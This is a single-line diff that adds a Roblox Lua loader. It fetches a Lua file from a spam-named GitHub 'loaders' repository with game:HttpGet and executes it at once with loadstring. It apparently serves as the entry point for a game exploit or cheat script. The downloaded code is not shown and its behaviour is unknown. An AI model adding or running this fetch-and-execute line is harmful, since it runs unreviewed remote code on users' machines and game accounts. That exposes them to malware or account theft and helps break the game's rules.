@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam3-idb9fja0fiml7z.lua"))()
